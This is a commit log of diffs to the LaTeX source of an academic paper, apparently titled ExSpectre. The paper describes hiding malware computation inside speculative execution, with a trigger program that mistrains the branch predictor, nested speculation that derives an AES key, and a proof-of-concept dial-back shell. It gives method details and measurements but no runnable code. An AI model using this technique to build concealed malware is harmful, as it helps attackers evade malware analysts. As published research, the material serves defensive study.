-        Using the speculative primitive, 1KB of data
-        can be decrypted and exfiltrated at a speed between 5 and 6 kbps from
-        the speculative world with 20 iterations per round for guaranteed
-        correctness.  Varying the width of the channel results in competing
-        performance factors, with an optimal throughput achieved at 8~bits.}
+        Using our speculative primitive, 1KB of data
+        can be decrypted and exfiltrated at a speed between 5 and 6~Kbps from
+        the speculative world with 20 redundant iterations per round (to ensure
+        correctness). Increased channel width exfiltrates more data per round,
+        but takes longer to measure the cache side channel. Optimal throughput is
+        achieved with an 8-bit channel.}
     \label{fig:spec_bandwidth}

### 2018-12-01 paper/figures.tex
add table

@@
     % \includegraphics[clip, trim=6cm 13.5cm 3.8cm 5cm, width=0.9\linewidth]{figures/exspectre-high-level.pdf}
-    \includegraphics[width=0.9\linewidth]{figures/exspectre-high-level-trimmed.pdf}
+    \includegraphics[width=0.9\linewidth]{figures/exspectre-high-level-new.pdf}
+    \includegraphics[width=0.4\textwidth]{figures/ExSpectre_CR_key.png}
     \caption{\textbf{\speculake}\,---\,%
@@
         \includegraphics[width=0.4\textwidth]{figures/general_model.pdf}
-        \includegraphics[width=0.4\textwidth]{figures/ExSpectre_CR_key.png}
         \caption{\textbf{ExSpectre model}\,---\,%
@@
 }
+
+\newcommand{\processorTable}{
+\begin{table}
+    \centering
+    \resizebox{\linewidth}{!}{\begin{tabularx}{\linewidth}{l X X| Y Y Y}
+        Processor & Year\newline
+        released & Micro\newline
+        arch & Nested\newline 
+        Spec? & Num\newline
+        indirect jumps* & Max $\mu$~ops\newline
+        (nop)\\
+        \hline
+        Intel Xeon CPU E3-1270 v6 & 2017 & Skylake & \checkmark & 28 & 220\\
+        Intel Core i5-7200U       & 2016 & Skylake & \checkmark & 26 & 220\\
+        Intel Xeon CPU E3-1276 v3 & 2014 & Haswell &            & ?  & ?  \\
+        AMD EPYC 7251             & 2017 & Ryzen   &            & ?  & ?  \\
+    \end{tabularx}}
+    \caption{\textbf{Processor features}--- We analyzed the capability of
+    \speculake on three Intel and one AMD processor. Both Skylake processors
+    were capable of nested speculation (Section~\ref{sssec:nested-spec}) though
+    the older Haswell processor and the AMD processor were not. We found that
+    the Intel Xeon CPU E3-1270 v6 required 28 identical indirect jumps in the
+    trigger and payload programs to reliably enter the speculative world at the
+    desired address ($> 95\%$) while the Intel Core i5-7200U only required 26
+    jumps.}
+    \label{table:processors}
+\end{table}
+}

### 2018-12-07 paper/abstract.tex
formatting changes
abstract intro pass

@@
 \begin{abstract}
-Recently, the Spectre and Meltdown attacks have revealed serious vulnerabilities in modern CPU
-designs, allowing an attacker to exfiltrate data from sensitive programs. These
-vulnerabilities take advantage of speculative execution to coerce a processor to
-perform computation that would otherwise not occur, leaking the resulting
-information via side channels to an attacker.
+Recently, the Spectre and Meltdown attacks revealed serious vulnerabilities
+in modern CPU designs, allowing an attacker to exfiltrate data from sensitive
+programs. These vulnerabilities take advantage of speculative execution to
+coerce a processor to perform computation that would otherwise not occur,
+leaking the resulting information via side channels to an attacker.
 
-In this paper, we extend these ideas in a different direction, and leverage speculative
-execution in order to \emph{hide malware} from both static and dynamic analysis. Using this
-technique, critical portions of a malicious program's computation can be shielded from view,
-such that even a debugger following an instruction-level trace of the
-program cannot tell how its results were computed.
+In this paper, we extend these ideas in a different direction, and leverage
+speculative execution in order to \emph{hide malware} from both static and
+dynamic analysis. Using this technique, critical portions of a malicious
+program's computation can be shielded from view, such that even a debugger
+following an instruction-level trace of the program cannot tell how its results
+were computed.
 
@@
 trigger program runs on the same machine, it mistrains the CPU's branch
-predictor, causing the payload program to \emph{speculatively} execute code, and
-communicating its results back to the rest of the payload program, changes its
-behavior.
+predictor, causing the payload program to \emph{speculatively} execute its malicious
+payload, which communicates speculative results back to the rest of the payload program
+to change its real-world behavior.
 
@@
 decrypt memory using AES-NI instructions at over 5~kbps. Building on this, we
-are additionally able to decrypt and interpret
-a custom virtual machine language to perform arbitrary computation,
-allowing us to create a covert dial-back shell that executes in a few
-milliseconds. We also show how our corresponding trigger program
+decrypt and interpret
+a custom virtual machine language to perform arbitrary computation and system
+calls in the real world. We demonstrate this with a proof-of-concept dial back shell,
+which takes only a few milliseconds to execute after the trigger is issued.
+We also show how our corresponding trigger program
 can be a pre-existing benign application already running on the system, and
@@
 
-%Finally, we describe defenses, but in all honesty, you're probably not going to like
-%them.
-
 \speculake demonstrates a new kind of malware that evades existing reverse
@@
 contained in seemingly unreachable dead code, and its control flow driven
-externally by potentially any other program running at the same time, \speculake poses a
-novel threat to state-of-the-art malware analysis techniques.
+externally by potentially any other program running at the same time, \speculake
+poses a novel threat to state-of-the-art malware analysis techniques.
 

### 2018-12-07 paper/introduction.tex
Added description of arbitrary memory read methodology
abstract intro pass

@@
 if discarded, as careful CPU design maintains strict separation between
-speculative results and updates to architectual state. However, recent research
+speculative results and updates to architectural state. However, recent research
 has revealed side channels that violate this separation, and researchers have
@@
 trigger program to mis-train the CPU's indirect branch predictor, causing the
-payload program to briefly speculatively execute a hidden target function.
+payload program to briefly execute a hidden target function speculatively.
 
@@
 
-It is also possible that a trigger program be a
+It is also possible for a trigger program to be a
 \emph{benign} program already on the victim's computer. We
@@
 program in Section~\ref{subsec:openssl}, activating a malicious payload program
-when an adversary connects to the infected OpenSSL server using a
+when an adversary repeatedly connects to the infected OpenSSL server using a
 TLS connection with a specific cipher suite.
@@
 potential trigger programs or inputs through the simulator, including benign
-programs with real-world inputs. Both of these contribute to a time-consuming and expensive
+programs with real world inputs. Both of these contribute to a time-consuming and expensive
 endeavor for would-be analysts, giving the attacker a significant advantage.
@@
 window is mainly limited by the CPU's reorder buffer, which
-allows us to execute between 100 and 200 instructions speculatively on modern
+allows us to execute up to 200 instructions speculatively on modern
 Intel CPUs. While brief, we show how to perform execution in short steps,

### 2018-12-07 paper/architecture.tex
add table
add reference to table 1

@@
 \texttt{retq}, \texttt{callq *\%rax}, and \texttt{jmpq *\%rax}\footnote{other
-general purpose registers besides \texttt{\%rax} can be used as well}.
-We created a simple trigger program that performs a series of 28 indirect
-branches
-using \texttt{jmpq *\%rax} instructions, as we found that 28 jumps was the minimum
-needed to reliably train the indirect branch predictor. 
-Between each jump, we incremented
-\texttt{\%rax} accordingly to continue on to the next jump. After these 28
-jumps, we load a function pointer into \texttt{\%rax} and do a final indirect
-branch using \texttt{callq *\%rax}. In our trigger, we perform these jumps
-        repeatedly in a loop.
+general purpose registers besides \texttt{\%rax} can be used as well}. We
+created a simple trigger program that performs a series of indirect branches
+using \texttt{jmpq *\%rax} instructions.
+%, as we found that 28 jumps was the
+%minimum needed to reliably train the indirect branch predictor. 
+Between each
+jump, we incremented \texttt{\%rax} accordingly to continue on to the next jump.
+After these jumps, we load a function pointer into \texttt{\%rax} and do a
+final indirect branch using \texttt{callq *\%rax}. In our trigger, we perform
+these jumps repeatedly in a loop.
 
-In our payload program, we first perform the same 28 indirect jumps. We ensure
-the source and destination addresses of these jumps is the same as in the trigger program by
-manually defining their containing function at a fixed address inside a linker
-script. We also do the final indirect call to a function pointer, but with two
-differences. First, the destination in the function pointer is a different
-address, and second, the memory location of the function pointer itself is uncached.
-This forces the CPU to predict the destination of the final indirect call while it
-waits for the function pointer to load from memory. Due to the similar
-history of branches with the trigger program,
-the CPU will (incorrectly) predict the destination to be the same as the one in
-the trigger program, which determines the speculative entry point for the
-payload. Even though the in-order execution of
-payload program never executes or even reads from this address, the CPU will
-briefly execute instructions there speculatively.
+In our payload program, we first perform the same indirect jumps. We ensure
+the source and destination addresses of these jumps is the same as in the
+trigger program by manually defining their containing function at a fixed
+address inside a linker script. We also do the final indirect call to a function
+pointer, but with two differences. First, the destination in the function
+pointer is a different address, and second, the memory location of the function
+pointer itself is uncached. This forces the CPU to predict the destination of
+the final indirect call while it waits for the function pointer to load from
+memory. Due to the similar history of branches with the trigger program, the CPU
+will (incorrectly) predict the destination to be the same as the one in the
+trigger program, which determines the speculative entry point for the payload.
+Even though the in-order execution of payload program never executes or even
+reads from this address, the CPU will briefly execute instructions there
+speculatively. \processorTable
+
+In Table~\ref{table:processors} we analyze the number of necessary training
+indirect jumps various processors require to consistently ($> 95\%$) have the
+payload program enter the speculative world at the location primed in the
+trigger program. We found that 28 indirect jumps was sufficient for our trigger
+program on each of the test processors to reliably ensure the speculative
+execution began at the correct address.
 

### 2018-12-07 paper/architecture.tex
clean up description of uops

@@
 We find that when executing speculatively, the number of instructions completed
-is rarely limited by cache miss duration. Instead
-ROB size and processor mechanisms for resolving
-data dependencies define an upper boundary of approximately 150
-instructions\footnote{While \texttt{nop} is able to execute up to the full 220
-ROB capacity, instructions that do useful work (and/or use multiple $\mu$ ops) cannot reach this limit}.
+is rarely limited by cache miss duration. While data dependency and ROB size
+have an effect on the number of instructions that can be executed speculative
+Figure~\ref{fig:spec-capacity-np} demonstrates that the number of $\mu$-ops of
+the instructions is the major limiting factor that define an upper boundary of
+approximately 150 instructions\footnote{While \texttt{nop} is able to execute up
+to the full 220 ROB capacity, instructions that do useful work (and/or use
+multiple $\mu$ ops) cannot reach this limit}.
 

### 2018-12-07 paper/payloads.tex
add new references and reference figure 6

--- 2018-08-03 paper/payloads.tex
@@
 
-We can overcome
-this by having the trigger program communicate the decryption key to the payload
-program via the branch predictor. To accomplish this, we use multiple speculative
-entry points, each that derives a
-different decryption key before calling a common decryption routine. Since
-the exact speculative entry point is determined by the trigger program, an
-analyst cannot discover the decryption key directly from the payload program.
+We can overcome this by having the trigger program communicate the decryption
+key to the payload program via the branch predictor. Previous work has analyzed
+the capability of the branch predictor to distribute keys to other
+programs~\cite{evtyushkin2016jump, lee2017inferring, aciiccmez2007predicting}
+and demonstrated that this is not a secure method of key distribution. However,
+the goal of using the branch predictor is not share a single secret via entry
+point but rather to use multiple jumps to construct the decryption key
+speculatively. To accomplish this, we use multiple speculative entry points,
+each that derives a different decryption key before calling a common decryption
+routine. Since the exact speculative entry point is determined by the trigger
+program, an analyst cannot discover the decryption key directly from the payload
+program.
 
@@
 
-To increase security, we instead use nested speculation to \emph{chain} entry points
-together. Rather than derive
-the key from a single entry point, we have each potential entry point perform
-another indirect jump that the CPU cannot immediately resolve, forcing it to
-speculate while already executing speculatively. The predicted target of that jump
-will also be determined by the trigger program. For example, if the trigger
-program makes 30 training jumps, followed by 10 additional indirect jumps, and
-the payload program performs the same 30 training jumps before a stall, the CPU
-will predict the payload program will also perform the next 10 jumps. If each
-jump has the potential to land in up to 1024 possible locations, this would
-provide in total $1024^{10} = 2^{100}$ possible keys, or 100~bits of security.
-We describe our implementation of nested speculative execution in
+To increase security, we instead use nested speculation to \emph{chain} entry
+points together. Rather than derive the key from a single entry point, we have
+each potential entry point perform another indirect jump that the CPU cannot
+immediately resolve, forcing it to speculate while already executing
+speculatively. The predicted target of that jump will also be determined by the
+trigger program. Meaning that an analyst that is (somehow, possibly via oracle,
+or attacks similar to~\cite{aciiccmez2007predicting}) able to determine the
+location of first speculative jump is still unable to reconstruct the whole key
+as future speculative jumps are determined solely by the trigger program which
+the analyst does not have access to.
+
+For example, if the trigger program makes 30 training jumps, followed by 10
+additional indirect jumps, and the payload program performs the same 30 training
+jumps before a stall, the CPU will predict the payload program will also perform
+the next 10 jumps. Speculatively the CPU will attempt to follow each of these
+jumps speculatively.
+
+If each jump has the potential to land in up to 1024 possible locations, this
+would provide in total $1024^{10} = 2^{100}$ possible keys, or 100~bits of
+security. We describe our implementation of nested speculative execution in
 Section~\ref{subsec:impl-aes}, where we achieve 128~bits of security.
-%Section~\ref{subsec:nested-spec}.
+Figure~\ref{fig:nested-spec} demonstrates this in practice, the trigger program
+running a series of training jumps followed by indirect jumps influences the
+payload program to follow the same path. Any analyst attempting to follow this
+path without the trigger program would need to correctly jump to each of the 10
+addresses to load the correct key. The security gained here is not a result of a
+single entry point remaining secret but rather multiple independent jumps by the
+unknown trigger program providing numerous landing points for each jump.
+
+\FigNestedSpec
 

### 2018-12-10 paper/figures.tex
fix table formatting
filled table

@@
     \centering
-    \resizebox{\linewidth}{!}{\begin{tabularx}{\linewidth}{l X X| Y Y Y}
-        Processor & Year\newline
-        released & Micro\newline
-        arch & Nested\newline 
+    % \resizebox{\linewidth}{!}{\begin{tabularx}{\linewidth}{X X X| Y Y Y}
+    \begin{tabularx}{\linewidth}{X b b| Y Y Y}
+        \ \newline
+        \ \newline
+        Processor & \ \newline
+        Year\newline
+        released & \ \newline
+        Micro\newline
+        arch & \ \newline
+        Nested\newline 
         Spec? & Num\newline
@@
         Intel Core i5-7200U       & 2016 & Skylake & \checkmark & 26 & 220\\
-        Intel Xeon CPU E3-1276 v3 & 2014 & Haswell &            & ?  & ?  \\
-        AMD EPYC 7251             & 2017 & Ryzen   &            & ?  & ?  \\
-    \end{tabularx}}
+        Intel Xeon CPU E3-1276 v3 & 2014 & Haswell &            & 26 & 178\\
+        AMD EPYC 7251             & 2017 & Ryzen   &            & 4  & 178\\
+        \\
+    \end{tabularx}%}
     \caption{\textbf{Processor features}--- We analyzed the capability of

### 2018-12-10 paper/payloads.tex
clear up 'security gained here'

@@
 path without the trigger program would need to correctly jump to each of the 10
-addresses to load the correct key. The security gained here is not a result of a
-single entry point remaining secret but rather multiple independent jumps by the
-unknown trigger program providing numerous landing points for each jump.
+addresses to load the correct key. The secret key created here is not a result
+of a single entry point remaining secret (via the branch predictor) but rather
+multiple independent jumps by the unknown trigger program providing numerous
+landing points for each jump.
 

### 2018-12-10 paper/introduction.tex
add blog citation

@@
 \speculake provides a new technique to malware authors, allowing them to hide
-program functionality in code that appears to not execute at runtime. This technique
-defeats existing static and dynamic analysis, making it especially difficult for
-malware analysts to determine what a binary will do.
+program functionality in code that appears to not execute at runtime by
+leveraging Spectre as a feature~\cite{necessaryBlog}. This technique defeats
+existing static and dynamic analysis, making it especially difficult for malware
+analysts to determine what a binary will do.
 

### 2018-12-10 paper/architecture.tex
fix typos add clarifications

--- 2018-12-07 paper/architecture.tex
@@
 
-In this subsection, we will describe the trigger program variant, and defer discussion 
-on how input data can be used a speculative trigger to
+In this subsection, we will describe the trigger program variant, and defer
+discussion on how input data can be used as a speculative trigger to
 Section~\ref{subsec:spec-buffer-overflow}.
@@
 reads from this address, the CPU will briefly execute instructions there
-speculatively. \processorTable
+speculatively.
+
+\processorTable
 
@@
 indirect jumps various processors require to consistently ($> 95\%$) have the
-payload program enter the speculative world at the location primed in the
-trigger program. We found that 28 indirect jumps was sufficient for our trigger
-program on each of the test processors to reliably ensure the speculative
-execution began at the correct address.
+payload program enter the speculative world at the chosen speculative entry
+point in the trigger program. We found that 28 indirect jumps was sufficient for
+our trigger program on each of the test processors to reliably ensure the
+speculative execution began at the correct speculative entry point.
 
@@
 We find that when executing speculatively, the number of instructions completed
-is rarely limited by cache miss duration. Instead
-ROB size and processor mechanisms for resolving
-data dependencies define an upper boundary of approximately 150
-instructions\footnote{While \texttt{nop} is able to execute up to the full 220
-ROB capacity, instructions that do useful work (and/or use multiple $\mu$ ops) cannot reach this limit}.
+is rarely limited by cache miss duration. While data dependency and ROB size
+have an effect on the number of instructions that can be executed speculatively
+Figure~\ref{fig:spec-capacity-np} demonstrates that the number of $\mu$-ops of
+the instructions is the major limiting factor that define an upper boundary of
+approximately 150 instructions\footnote{While \texttt{nop} is able to execute up
+to the full 220 ROB capacity, instructions that do useful work (and/or use
+multiple $\mu$ ops) cannot reach this limit}.
 

### 2018-12-10 paper/figures.tex
fix typos add clarifications

@@
     \caption{\textbf{Processor features}--- We analyzed the capability of
-    \speculake on three Intel and one AMD processor. Both Skylake processors
+    \speculake on one AMD and three Intel processors. Both Skylake processors
     were capable of nested speculation (Section~\ref{sssec:nested-spec}) though
@@
     trigger and payload programs to reliably enter the speculative world at the
-    desired address ($> 95\%$) while the Intel Core i5-7200U only required 26
-    jumps.}
+    desired speculative entry point ($> 95\%$) while the Intel Core i5-7200U
+    and Intel Xeon CPU E3-1276 v3 only required 26 jumps. The AMD EPYC 7251
+    processor maintained a 85\% speculative hit rate with as low as 4 and as
+    high as 32 training jumps.}
     \label{table:processors}

### 2018-12-10 paper/payloads.tex
fix typos add clarifications

--- 2018-12-07 paper/payloads.tex
@@
 the next 10 jumps. Speculatively the CPU will attempt to follow each of these
-jumps speculatively.
+jumps.
 
@@
 path without the trigger program would need to correctly jump to each of the 10
-addresses to load the correct key. The security gained here is not a result of a
-single entry point remaining secret but rather multiple independent jumps by the
-unknown trigger program providing numerous landing points for each jump.
+addresses to load the correct key. The secret key created here is not a result
+of a single entry point remaining secret (via the branch predictor) but rather
+multiple independent jumps by the unknown trigger program providing numerous
+potential speculative entry points for each jump.
 

### 2018-12-10 paper/implementation.tex
Included multi-indexing in bandwidth section

@@
 optimal side channel width, allowing us to decrypt over 5,000 bits per second
-(625 Bytes/sec).
+(625 Bytes/sec). We have managed to improve upon this number by loading multiple 
+values into the probe array in any given round. For example, a probe array 
+of size 1024 can be split into four sections of 256 bits, each with their 
+own index -- providing a 32 bit channel overall. The drawback of this 
+method is that loading these values into the probe array is a non-zero 
+exspense on the limited $\mu$~operation budget. We have successfully 
+implemented a decrypt gadget that passes 32 bits per round using four indices 
+into a 1024 bit probe array, which is able to decrypt over 11,000 bits per second 
+(1,425 Bytes/sec).
+
 % Iterations: 20

### 2018-12-10 paper/architecture.tex
fix idiv numbers

@@
 that the instruction uses, which appears to be what is tracked in the ROB. For
-instance, on our architecture, the 64-bit \texttt{idiv} instruction takes 59~$\mu$~ops,
-and we can execute up to 3 of them in the speculative world.
-Meanwhile, we can execute up to 18 32-bit \texttt{idiv} instructions, which each
-take 9~$\mu$~ops~\cite{intel-instruction-tables}. These suggest we can execute
+instance, on our Skylake architecture, the 64-bit \texttt{idiv} instruction
+takes 57~$\mu$~ops, and we can execute up to 3 of them in the speculative world.
+Meanwhile, we can execute up to 12 32-bit \texttt{idiv} instructions, which each
+take 10~$\mu$~ops~\cite{intel-instruction-tables}. This suggest we can execute
 on the order of 175~$\mu$~ops before the speculative world expires.

### 2018-12-10 paper/figures.tex
Minor fixes, added bandwidth recomputation to abstract and fixed cropping in figure 6

@@
     % \includegraphics[clip, trim=6cm 13.5cm 3.8cm 5cm, width=0.9\linewidth]{figures/exspectre-high-level.pdf}
-    \includegraphics[width=0.95\linewidth]{figures/ExSpectre_CR_Nested.png}
+    \includegraphics[width=0.95\linewidth]{figures/ExSpectre_CR_Nested.pdf}
     \caption{\textbf{Nested Speculation}\,---\,%
@@
         Using our speculative primitive, 1KB of data
-        can be decrypted and exfiltrated at a speed between 5 and 6~Kbps from
+        can be decrypted and exfiltrated at a speed of 5.38~Kbps from
         the speculative world with 20 redundant iterations per round (to ensure

### 2018-12-11 paper/implementation.tex
impl pass, nested spec pass

--- 2018-08-07 paper/implementation.tex
@@
 optimal side channel width, allowing us to decrypt over 5,000 bits per second
-(625 Bytes/sec).
+(625 Bytes/sec). We note an improvement over this rate by loading multiple
+values into the probe array during speculation. Instead of a single
+probe array of 1024 entries communicating 10-bits, we can split the array into
+four sections of 256 entries each, and signal four times (one per section) during
+speculation. This provides a 32-bit channel overall, while only having to probe
+1024 entries. This method is limited by the limited $\mu$~operation budget,
+however, our implementation using these parameters (four sections of 256
+entries) is able to decrypt over 11~Kbps (1,425 Bytes/sec).
+
 % Iterations: 20

### 2018-12-11 paper/payloads.tex
impl pass, nested spec pass

--- 2018-12-07 paper/payloads.tex
@@
 We can overcome this by having the trigger program communicate the decryption
-key to the payload program via the branch predictor. Previous work has analyzed
-the capability of the branch predictor to distribute keys to other
-programs~\cite{evtyushkin2016jump, lee2017inferring, aciiccmez2007predicting}
-and demonstrated that this is not a secure method of key distribution. However,
-the goal of using the branch predictor is not share a single secret via entry
-point but rather to use multiple jumps to construct the decryption key
-speculatively. To accomplish this, we use multiple speculative entry points,
-each that derives a different decryption key before calling a common decryption
+key to the payload program via the branch predictor. While prior work has used
+the branch predictor to exfiltrate keys from other sensitive
+processes~\cite{lee2017inferring}, we inject a key into the speculating payload program
+from the external trigger program. To do this, we use
+multiple speculative entry points, each that derives a unique decryption key
+before calling a common decryption
 routine. Since the exact speculative entry point is determined by the trigger
-program, an analyst cannot discover the decryption key directly from the payload
+program, an analyst cannot trivially discover the decryption key directly from the payload
 program.
@@
 until they find one that correctly decrypts the ciphertext. In a 1~MB binary,
-there are (at most) only 1~million entry points, providing just 20~bits of
-security, trivial for an analyst to brute force.
+there are (at most) only 1~million possible entry points, providing just 20~bits of
+security, trivial for an analyst to brute force. An analyst simply needs to test
+each of the $2^{20}$ entry potential entry points to discover the correct key.
 
-To increase security, we instead use nested speculation to \emph{chain} entry
+To increase security,
+we instead use nested speculation to \emph{chain} entry
 points together. Rather than derive the key from a single entry point, we have
@@
 immediately resolve, forcing it to speculate while already executing
-speculatively. The predicted target of that jump will also be determined by the
-trigger program. Meaning that an analyst that is (somehow, possibly via oracle,
-or attacks similar to~\cite{aciiccmez2007predicting}) able to determine the
-location of first speculative jump is still unable to reconstruct the whole key
-as future speculative jumps are determined solely by the trigger program which
-the analyst does not have access to.
+speculatively. In other words, in the speculative world, we make an
+indirect jump that depends on a cache-evicted variable, prompting the CPU to double-speculate.
+The predicted target of that jump will also be driven by the
+trigger program's (mis)training of the indirect branch predictor.
+On CPUs that support double (or arbitrarily nested)
+speculation, we can repeat this process, with each new subsequent entry point
+determined by the trigger program. At each entry point, we shift in additional
+bits to a register as the AES key. Without the trigger program, an analyst
+cannot determine the path the payload program will take speculatively.
 
-For example, if the trigger program makes 30 training jumps, followed by 10
+%Meaning that an analyst that is (somehow, possibly via oracle,
+%or attacks similar to~\cite{aciiccmez2007predicting}) able to determine the
+%location of first speculative jump is still unable to reconstruct the whole key
+%as future speculative jumps are determined solely by the trigger program which
+%the analyst does not have access to.
+%
+
+As an illustrating example,
+imagine a trigger program makes 30 training jumps, followed by 10
 additional indirect jumps, and the payload program performs the same 30 training
-jumps before a stall, the CPU will predict the payload program will also perform
-the next 10 jumps. Speculatively the CPU will attempt to follow each of these
-jumps speculatively.
+jumps before a stall. At this point,
+the CPU will predict the payload program will also perform
+the next 10 jumps, speculatively following the pattern of the trigger program.
 
-If each jump has the potential to land in up to 1024 possible locations, this
-would provide in total $1024^{10} = 2^{100}$ possible keys, or 100~bits of
-security. We describe our implementation of nested speculative execution in
-Section~\ref{subsec:impl-aes}, where we achieve 128~bits of security.
+If each nested speculative jump has the potential to land in 4096 ($2^{12}$ possible locations,
+each
+entry point can shift in 12-bits to the key, for a total of 120-bits over the
+10 jumps before calling the common decryption routine. A key constructed in this
+way would be infeasible
+for an analyst to brute force, as the payload program yields no information
+about which of the potential $2^{120}$ keys will be derived.
+
+We describe our implementation of nested speculative execution in
+Section~\ref{subsec:impl-aes}, where we speculatively derive a 128~bit AES key.
 Figure~\ref{fig:nested-spec} demonstrates this in practice, the trigger program
 running a series of training jumps followed by indirect jumps influences the
-payload program to follow the same path. Any analyst attempting to follow this
-path without the trigger program would need to correctly jump to each of the 10
-addresses to load the correct key. The security gained here is not a result of a
-single entry point remaining secret but rather multiple independent jumps by the
-unknown trigger program providing numerous landing points for each jump.
+payload program to follow the same path.
+% Could cut? Redundant with above now
+%An analyst attempting to follow this
+%path without the trigger program would need to correctly jump to each of the 10
+%addresses to load the correct key. The secret key created here is not a result
+%of a single entry point remaining secret (via the branch predictor) but rather
+%multiple independent jumps by the unknown trigger program providing numerous
+%potential speculative entry points for each jump.
 

### 2018-12-11 paper/related-work.tex
add related work to blog

@@
 
+%programs~\cite{evtyushkin2016jump, lee2017inferring, aciiccmez2007predicting}
 Spectre builds upon prior work on cache side channels, and similarly uses them
@@
 predictors as a side channel~\cite{evtyushkin2018branchscope}.
-Researchers have also leveraged Spectre to demonstrate web-based
+Researchers have also leveraged Spectre and speculative execution more generally
+to demonstrate web-based
 vulnerabilities~\cite{genkin2018drive,schwarz2018netspectre} as well as to leak
-keys and other information from the hardware isolation provided by Intel
-SGX~\cite{spectre_sgx,chen2018sgxpectre,foreshadow}.
+control flow, keys, and other information from the hardware isolation provided by Intel
+SGX~\cite{spectre_sgx,chen2018sgxpectre,foreshadow,lee2017inferring}.
+Spectre has additionally been proposed as a way to thwart taint tracking by using speculative
+execution to copy data between buffers~\cite{necessaryBlog}.
 \speculake likewise takes advantage of speculative execution, but with the goal
 of hiding arbitrary computation from reverse engineering, rather than extracting
-secrets from vulnerable programs. \speculake additionally benefits from
+secrets from vulnerable programs. \speculake also benefits from
 new Spectre variants: as we showed, speculative buffer overflows (``Spectre~1.1'')

### 2018-12-11 paper/payloads.tex
add missing cite

@@
 the branch predictor to exfiltrate keys from other sensitive
-processes~\cite{lee2017inferring}, we inject a key into the speculating payload program
+processes~\cite{aciiccmez2007predicting}, we inject a key into the speculating payload program
 from the external trigger program. To do this, we use

### 2018-12-13 paper/figures.tex
table pass

@@
     \begin{tabularx}{\linewidth}{X b b| Y Y Y}
+        \toprule
         \ \newline
+        Processor &
+        %Year\newline
         \ \newline
-        Processor & \ \newline
-        Year\newline
-        released & \ \newline
-        Micro\newline
-        arch & \ \newline
-        Nested\newline 
-        Spec? & Num\newline
-        indirect jumps* & Max $\mu$~ops\newline
+        Released &
+        Micro- %\newline
+        arch. & Nested\newline 
+        Spec. &
+        Indirect jumps & $\mu$~ops\newline
         (nop)\\
         \hline
+        Intel Xeon CPU E3-1276 v3 & 2014 & Haswell &            & 26 & 178\\
+        Intel Core i5-7200U       & 2016 & Skylake & \checkmark & 26 & 220\\
         Intel Xeon CPU E3-1270 v6 & 2017 & Skylake & \checkmark & 28 & 220\\
-        Intel Core i5-7200U       & 2016 & Skylake & \checkmark & 26 & 220\\
-        Intel Xeon CPU E3-1276 v3 & 2014 & Haswell &            & 26 & 178\\
         AMD EPYC 7251             & 2017 & Ryzen   &            & 4  & 178\\
-        \\
+        \toprule
     \end{tabularx}%}
     \caption{\textbf{Processor features}--- We analyzed the capability of
-    \speculake on one AMD and three Intel processors. Both Skylake processors
-    were capable of nested speculation (Section~\ref{sssec:nested-spec}) though
-    the older Haswell processor and the AMD processor were not. We found that
-    the Intel Xeon CPU E3-1270 v6 required 28 identical indirect jumps in the
-    trigger and payload programs to reliably enter the speculative world at the
-    desired speculative entry point ($> 95\%$) while the Intel Core i5-7200U
-    and Intel Xeon CPU E3-1276 v3 only required 26 jumps. The AMD EPYC 7251
-    processor maintained a 85\% speculative hit rate with as low as 4 and as
-    high as 32 training jumps.}
+    \speculake on three Intel processors and one AMD. Both Skylake processors
+    were capable of nested speculation (Section~\ref{sssec:nested-spec}).
+    Indirect jumps is the number of common training indirect jumps needed
+    in the trigger program to reliably ($ > 95\%$ of the time) coerce the
+    payload program to follow the pattern and jump to the speculative entry
+    point specified in the trigger program. $\mu$~ops is the upper bound
+    of $\mu$~ops that can be performed speculatively.}
+
     \label{table:processors}

### 2018-12-13 paper/figures.tex
updated figure 3 and associated caption

--- 2018-12-10 paper/figures.tex
@@
     \caption{\textbf{Speculative limits}\,---\,%
-    To find the number of instructions we can execute speculatively, we placed a speculative load
-    after an increasing number of instructions, and measured the fraction of times the load
-    was subsequently in cache. However, more complex instructions
-    have stricter constraints, generally corresponding to the number of $\mu$-ops that an instruction
-    comprises. We find that we can execute up to 220 instructions 
-    speculatively, which corresponds with the size of the CPU's reorder buffer (ROB). We measure 
-    the ROB size by timing two cache accesses with a variable number of 
-    instructions between them. The step in cycles around 220 instructions indicates that the 
-    second cache access was pushed out of the ROB defining an upper limit on size.  }
+    To find the number of instructions we can execute speculatively we placed a signal gadget
+    after an increasing number of instructions and measured the fraction of times the 
+    loaded value was subsequently in cache. However more complex instructions have stricter 
+    constraints applied at two limits that we have identified, cache latency cycle limitation, and 
+    the CPU's reorder buffer~(ROB) size as measured by instruction $\mu$-ops. We find that the
+    hit fraction for instructions with a ratio of cycle latency to $\mu$~ops greater than 1 undergo a
+    steep drop to \~0.1 hit fraction before falling definitively to 0. The drop in hit fraction 
+    indicates that the duration of the test in cycles is beyond the fist step in cache latency as shown in 
+    Figure~\ref{fig:cache-miss} (approx. 200 cycles). If the instruction sequence does not reach the 
+    cycle count limit we see only a sharp drop in hit fraction to 0 indicating the limiting factor 
+    is ROB size.  For example, the \texttt{idiv (r32)} instruction we identify 18 as the maximum number of 
+    instruction limited by ROB (with ~15 instructions for signal gadget), with a soft limit of 
+    12 instructions enforced by the cache latency cycle limitation. 
+    We measure the ROB size by timing two cache accesses with a variable number of 
+    instructions between them and note that this aligns with the measured maximum \texttt{nop} instrustions.
+    }
     \label{fig:spec-capacity-np}

### 2018-12-13 paper/architecture.tex
Updated figure 3 and speculative limitations subsection

@@
 When executing instructions speculatively we rely on a memory load of a function
-pointer from uncached memory. Thus, one potential limit on our computation comes
+pointer from uncached memory. Thus, one limit on our computation comes
 in the form of the time it takes for the memory read to return with a result
@@
 Figure~\ref{fig:cache-miss} shows the CDF of cycles taken. In the typical case,
-an evicted item takes approximately 300 clock cycles to load from the Level 3 cache (L3), which
-would allow a limit of roughly 200 speculative instructions to be
+an evicted item takes approximately 200 clock cycles to load from the Level 3 cache (L3), which
+would allow a limit of roughly 200 speculative instructions depending on
+specific cycles per instruction (CPI), to be
 executed during that time. We note that when an item is not in L3, it takes
@@
 takes 57~$\mu$~ops, and we can execute up to 3 of them in the speculative world.
-Meanwhile, we can execute up to 12 32-bit \texttt{idiv} instructions, which each
+Meanwhile, we can execute up to 18 32-bit \texttt{idiv} instructions, which each
 take 10~$\mu$~ops~\cite{intel-instruction-tables}. This suggest we can execute
@@
 We find that when executing speculatively, the number of instructions completed
-is rarely limited by cache miss duration. While data dependency and ROB size
-have an effect on the number of instructions that can be executed speculatively
-Figure~\ref{fig:spec-capacity-np} demonstrates that the number of $\mu$-ops of
+has a soft limit and a hard limit. The duration in cycles applies a soft limit, 
